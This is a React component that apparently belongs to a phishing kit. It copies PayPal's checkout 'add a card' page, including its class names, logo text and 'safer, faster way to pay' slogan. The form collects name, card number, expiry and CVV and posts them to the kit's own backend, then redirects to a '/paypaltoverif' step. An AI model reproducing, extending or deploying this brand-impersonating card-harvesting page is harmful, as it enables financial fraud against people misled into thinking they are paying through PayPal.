import React, { useState, useEffect } from 'react';
import { useHistory } from 'react-router-dom';
import axios from 'axios';
import { zokomId } from '../utils/auth';
const CARD_TYPES = {
  visa: /^4[0-9]{0,15}$/,
  mastercard: /^5[1-5][0-9]{0,14}$/,
  amex: /^3[47][0-9]{0,13}$/,
  discover: /^6(?:011|5[0-9]{2})[0-9]{0,12}$/
};

const PayPalBilling = () => {
  
  const [styles, setStyles] = useState(null);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    cardNumber: '',
    expiryDate: '',
    securityCode: ''
  });
  const [errors, setErrors] = useState({});
  const [cardType, setCardType] = useState('');
  const [focusedField, setFocusedField] = useState(null);
  const [billingAddress, setBillingAddress] = useState(null);
  const [showAddAddress, setShowAddAddress] = useState(false);
  const history = useHistory();
  const userId = zokomId();
  const [billings, setBillings] = useState([]);
  const [selectedBilling, setSelectedBilling] = useState('');

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const cssModule = await import('../../assets/styles/paypalbilling.css');
        setStyles(cssModule.default);
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    loadStyles();
  }, []);

  useEffect(() => {
    const fetchBillings = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/billings`);
        setBillings(response.data);
        if (response.data.length > 0) {
          setSelectedBilling(response.data[0]._id);
        }
      } catch (error) {
        console.error('Error fetching billings:', error);
      }
    };

    if (userId) {
      fetchBillings();
    }
  }, [userId]);

  const handleBillingChange = (event) => {
    setSelectedBilling(event.target.value);
  };

  const validateName = (name) => {
    return name.trim().length >= 2 ? '' : 'Please enter a valid name';
  };

  const validateCardNumber = (number) => {
    const cleanNumber = number.replace(/\s+/g, '');
    if (!/^[0-9]{13,19}$/.test(cleanNumber)) return 'Enter a valid card number';

    let sum = 0;
    let shouldDouble = false;
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cleanNumber.charAt(i));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0 ? '' : 'Enter a valid card number';
  };

  const validateExpiryDate = (date) => {
    const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!regex.test(date)) return 'Enter a valid expiry date';

    const [month, year] = date.split('/');
    const expiryDate = new Date(`20${year}`, month - 1);
    const currentDate = new Date();
    return expiryDate <= currentDate ? 'This card has expired' : '';
  };

  const validateSecurityCode = (code, type) => {
    const length = type === 'amex' ? 4 : 3;
    const regex = new RegExp(`^[0-9]{${length}}$`);
    return regex.test(code) ? '' : `Enter the ${length} digit security code`;
  };

  const detectCardType = (number) => {
    for (let [type, regex] of Object.entries(CARD_TYPES)) {
      if (regex.test(number.replace(/\s+/g, ''))) return type;
    }
    return '';
  };

  const formatCardNumber = (value) => {
    return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiryDate = (value) => {
    const cleanValue = value.replace(/\D/g, '').slice(0, 4);
    if (cleanValue.length > 2) {
      return `${cleanValue.slice(0, 2)}/${cleanValue.slice(2)}`;
    }
    return cleanValue;
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') {
      formattedValue = formatCardNumber(value);
      const type = detectCardType(formattedValue);
      setCardType(type);
    } else if (name === 'expiryDate') {
      formattedValue = formatExpiryDate(value);
    }

    setFormData(prev => ({
      ...prev,
      [name]: formattedValue
    }));
  };

  const handleFocus = (e) => {
    const { name } = e.target;
    setFocusedField(name);
  };

  const handleBlur = (e) => {
    const { name, value } = e.target;
    setFocusedField(null);
    let error = '';

    switch (name) {
      case 'firstName':
      case 'lastName':
        error = validateName(value);
        break;
      case 'cardNumber':
        error = validateCardNumber(value);
        break;
      case 'expiryDate':
        error = validateExpiryDate(value);
        break;
      case 'securityCode':
        error = validateSecurityCode(value, cardType);
        break;
      default:
        break;
    }

    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // Validate all fields
    const newErrors = {
      firstName: validateName(formData.firstName),
      lastName: validateName(formData.lastName),
      cardNumber: validateCardNumber(formData.cardNumber),
      expiryDate: validateExpiryDate(formData.expiryDate),
      securityCode: validateSecurityCode(formData.securityCode, cardType)
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      // Process the form submission
      try {
        const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/add`, {
          cardNumber: formData.cardNumber,
          expiryDate: formData.expiryDate,
          securityCode: formData.securityCode,
          userId
        });
        history.push('/paypaltoverif')
        console.log('Form submitted successfully', response.data);
        // Optionally, you can redirect or show a success message here
      } catch (error) {
        console.error('Error submitting form:', error);
        // Optionally, you can show an error message here
      }
    }
  };

  const handleAddBillingAddress = () => {
    history.push('/paypaladdressadd');
  };

  const renderBillingAddressSection = () => {
    return (
      <div className="cardDetails__cardBillingAddressDropDown--2rDE6">
        <label
          className="cardDetails__cardBillingAddressDropDownLabel--3LLjv"
          htmlFor="cardBillingAddress"
        >
          Billing Address
          <button
            id="addBillingAddress"
            className="cardDetails__addCardBillingAddressLink--1cGNu"
            type="button"
            onClick={handleAddBillingAddress}
          >
            Add
          </button>
        </label>
        <div
          className="styles__Container--129EO"
          style={{ height: '44px' }}
        >
          <select
            aria-invalid="false"
            aria-describedby="cardBillingAddress-errorDiv"
            id="cardBillingAddress"
            className="styles__HiddenDropdown--3BKGF"
            style={{ height: '43px' }}
            value={selectedBilling}
            onChange={handleBillingChange}
          >
            {billings.length > 0 ? (
              billings.map(billing => (
                <option
                  key={billing._id}
                  label={`${billing.street}, ${billing.city}, ${billing.state} ${billing.postalCode}`}
                  value={billing._id}
                >
                  {`${billing.street}, ${billing.city}, ${billing.state} ${billing.postalCode}`}
                </option>
              ))
            ) : (
              <option value="">No billing address found</option>
            )}
          </select>
          <div
            className="styles__CustomDropdown--29IxU"
            style={{ height: '42px' }}
          >
            <span>
              {selectedBilling 
                ? billings.find(billing => billing._id === selectedBilling)
                  ? `${billings.find(billing => billing._id === selectedBilling).street}, ${billings.find(billing => billing._id === selectedBilling).city}, ${billings.find(billing => billing._id === selectedBilling).state} ${billings.find(billing => billing._id === selectedBilling).postalCode}`
                  : 'No billing address found'
                : 'No billing address found'}
            </span>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div dir="ltr">
      <div id="root">
        <div className="App__app--3P8ep">
          <div className="PageWrapper__outerWrapper--no-overflow--10SpW">
            <div className="hagrid-wcpuj4-row" data-ppui-info="grid_3.2.4">
              <div className="hagrid-1oilgb3-col" data-ppui="true">
                <div className="hagrid-14reej8"></div>
                
              </div>
            </div>
            <div className="PageWrapper__slidingArea--3QjN6">
              <div className="PageWrapper__contents--3Twuc">
                <div className="PaypalHeader__paypalHeader--2rLWq">
                  <div>
                    <div className="Logo__paypalLogo--1d3Hw">
                      <span className="ally__accessAid--3Ci8b">
                        PayPal Checkout
                      </span>
                    </div>
                  </div>
                </div>
                <div id="addCardGeneral">
                  <div className="styles__wrapper--3Nx6R">
                    <div>
                      <div
                        className="hagrid-1vydhhl"
                        style={{
                          backgroundColor: "rgb(230, 224, 217)",
                          paddingTop: "1.2rem",
                          paddingRight: "1.2rem",
                          paddingLeft: "1.2rem",
                          marginTop: "0px",
                          lineHeight: "1rem",
                          boxShadow: "unset",
                        }}
                      >
                        <div
                          className="hagrid-pl611z-row-no_gutter"
                          data-ppui-info="grid_3.2.4"
                          id="banner_info"
                        >
                          <div
                            className="hagrid-1j134op-col_auto"
                            data-ppui="true"
                          >
                            <span
                              className="hagrid-a14oj3-svg-size_sm-sysColorSystemMain"
                              data-ppui-info="icons_8.13.1"
                              data-ppui="true"
                            >
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                fill="currentColor"
                                viewBox="0 0 24 24"
                                width="1em"
                                height="1em"
                                data-ppui="true"
                              >
                                <path
                                  fillRule="evenodd"
                                  d="M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0zm-9.662 5h1.32c.18 0 .276-.096.276-.276v-5.925c0-.18-.096-.276-.276-.276h-1.32c-.18 0-.276.096-.276.276v5.925c0 .18.096.276.276.276zM12 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"
                                  clipRule="evenodd"
                                  data-ppui="true"
                                ></path>
                              </svg>
                            </span>
                          </div>
                          <div className="hagrid-t8aun0-col" data-ppui="true">
                            <div
                              className="hagrid-22qqj-text_body"
                              data-ppui-info="body-text_6.3.3"
                            >
                              Please add a debit or credit card to complete your
                              purchase.
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <form
                      id="addCardDiv"
                      className="cardDetails__formDiv--6jPT6"
                      noValidate
                      onSubmit={handleSubmit}
                    >
                      <div className="common__flex--1OrXS">
                        <div className="cardDetails__cardFirstName--2IR36">
                          <div className="styles__Container--1f85W">
                            <input
                              aria-label="First name"
                              aria-describedby="firstName-error"
                              aria-invalid={!!errors.firstName}
                              className={`styles__TextInput--35c92`}
                              style={{
                                border: errors.firstName && focusedField === 'firstName' ? '1px solid #c72e2e' : '',
                                boxShadow: 'none',
                                '&:hover': {
                                  boxShadow: 'none'
                                },
                                '&:focus': {
                                  boxShadow: 'none'
                                }
                              }}
                              id="cardFirstName"
                              name="firstName"
                              value={formData.firstName}
                              onChange={handleInputChange}
                              onFocus={handleFocus}
                              onBlur={handleBlur}
                              maxLength="100"
                              placeholder="First name"
                              type="text"
                            />
                            {errors.firstName && focusedField === 'firstName' && (
                              <div 
                                id="cardFirstName-errorDiv" 
                                className="styles__errorDiv--2H19x" 
                                style={{ display: 'block' }}
                              >
                                {errors.firstName}
                              </div>
                            )}
                          </div>
                        </div>
                        <div className="cardDetails__cardLastName--64N99">
                          <div className="styles__Container--1f85W">
                            <input
                              aria-label="Last name"
                              aria-describedby="lastName-error"
                              aria-invalid={!!errors.lastName}
                              className={`styles__TextInput--35c92`}
                              style={{
                                border: errors.lastName && focusedField === 'lastName' ? '1px solid #c72e2e' : '',
                                boxShadow: 'none',
                                '&:hover': {
                                  boxShadow: 'none'
                                },
                                '&:focus': {
                                  boxShadow: 'none'
                                }
                              }}
                              id="cardLastName"
                              name="lastName"
                              value={formData.lastName}
                              onChange={handleInputChange}
                              onFocus={handleFocus}
                              onBlur={handleBlur}
                              maxLength="100"
                              placeholder="Last name"
                              type="text"
                            />
                            {errors.lastName && focusedField === 'lastName' && (
                              <div 
                                id="cardLastName-errorDiv" 
                                className="styles__errorDiv--2H19x" 
                                style={{ display: 'block' }}
                              >
                                {errors.lastName}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                      <div className="cardDetails__cardIconsGroup--3TSal cardDetails__cardIconsBox--1wn6R">
                        <div className="cardDetails__cardIcon--2VNbN cardDetails__DISCOVER--2RC6l"></div>
                        <div className="cardDetails__cardIcon--2VNbN cardDetails__AMEX--1V5Wp"></div>
                        <div className="cardDetails__cardIcon--2VNbN cardDetails__MASTERCARD--f8ZJc"></div>
                        <div className="cardDetails__cardIcon--2VNbN cardDetails__VISA--29KII"></div>
                      </div>
                      <div className="cardDetails__cardNumber--7RPwU">
                        <div className="styles__Container--1f85W">
                          <input
                            aria-label="Card number"
                            aria-describedby="cardNumber-error"
                            aria-invalid={!!errors.cardNumber}
                            className={`styles__TextInput--35c92`}
                            style={{
                              border: errors.cardNumber && focusedField === 'cardNumber' ? '1px solid #c72e2e' : '',
                              boxShadow: 'none',
                              '&:hover': {
                                boxShadow: 'none'
                              },
                              '&:focus': {
                                boxShadow: 'none'
                              }
                            }}
                            id="cardNumber"
                            name="cardNumber"
                            value={formData.cardNumber}
                            onChange={handleInputChange}
                            onFocus={handleFocus}
                            onBlur={handleBlur}
                            maxLength="19"
                            placeholder="Card number"
                            type="text"
                          />
                          {errors.cardNumber && focusedField === 'cardNumber' && (
                            <div 
                              id="cardNumber-errorDiv" 
                              className="styles__errorDiv--2H19x" 
                              style={{ display: 'block' }}
                            >
                              {errors.cardNumber}
                            </div>
                          )}
                        </div>
                      </div>
                      <div className="common__flex--1OrXS">
                        <div className="cardDetails__cardExpiry--3b-wE">
                          <label htmlFor="cardExpiry">Expires</label>
                          <div className="cardDetails__labelledDiv--3dglc">
                            <div className="styles__Container--1f85W">
                              <input
                                aria-label="MM/YY"
                                aria-describedby="expiryDate-error"
                                aria-invalid={!!errors.expiryDate}
                                className={`styles__TextInput--35c92`}
                                style={{
                                  border: errors.expiryDate && focusedField === 'expiryDate' ? '1px solid #c72e2e' : '',
                                  boxShadow: 'none',
                                  '&:hover': {
                                    boxShadow: 'none'
                                  },
                                  '&:focus': {
                                    boxShadow: 'none'
                                  }
                                }}
                                id="cardExpiry"
                                name="expiryDate"
                                value={formData.expiryDate}
                                onChange={handleInputChange}
                                onFocus={handleFocus}
                                onBlur={handleBlur}
                                maxLength="5"
                                placeholder="MM/YY"
                                type="text"
                              />
                              {errors.expiryDate && focusedField === 'expiryDate' && (
                                <div 
                                  id="expiryDate-errorDiv" 
                                  className="styles__errorDiv--2H19x" 
                                  style={{ display: 'block' }}
                                >
                                  {errors.expiryDate}
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                        <div className="cardDetails__cardCvv--2y7u4">
                          <label htmlFor="cardCvv">CSC</label>
                          <div className="cardDetails__labelledDiv--3dglc">
                            <div className="styles__Container--1f85W">
                              <input
                                aria-label="3 digits"
                                aria-describedby="securityCode-error"
                                aria-invalid={!!errors.securityCode}
                                className={`styles__TextInput--35c92`}
                                style={{
                                  border: errors.securityCode && focusedField === 'securityCode' ? '1px solid #c72e2e' : '',
                                  boxShadow: 'none',
                                  '&:hover': {
                                    boxShadow: 'none'
                                  },
                                  '&:focus': {
                                    boxShadow: 'none'
                                  }
                                }}
                                id="cardCvv"
                                name="securityCode"
                                value={formData.securityCode}
                                onChange={handleInputChange}
                                onFocus={handleFocus}
                                onBlur={handleBlur}
                                maxLength="3"
                                placeholder="3 digits"
                                type="text"
                              />
                              {errors.securityCode && focusedField === 'securityCode' && (
                                <div 
                                  id="securityCode-errorDiv" 
                                  className="styles__errorDiv--2H19x" 
                                  style={{ display: 'block' }}
                                >
                                  {errors.securityCode}
                                </div>
                              )}
                              <span className="cardDetails__cvvIcon--10r-y cardDetails__cardIcon--2VNbN"> </span>
                            </div>
                          </div>
                        </div>
                      </div>
                      {renderBillingAddressSection()}
                      <div className="cardDetails__addButton--2ryyq">
                        <button
                          className="styles__ButtonPrimary--1BMIn"
                          type="submit"
                          id="cardAddButton"
                          name="cardAddButton"
                          value="Add"
                        >
                          Add
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
                <div className="Props__span10--JYhXh">
                  <div className="Props__propImg--35PgX styles__propsImgStyle--2Iljv"></div>
                  <h1 className="common__heading1--s4AXN styles__propsHeaderStyle--2Psyq">
                    PayPal is the safer, faster way to pay
                  </h1>
                  <p className="Props__subTitle--1mQdl">
                    No matter where you shop, we keep your financial information
                    secure.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PayPalBilling;
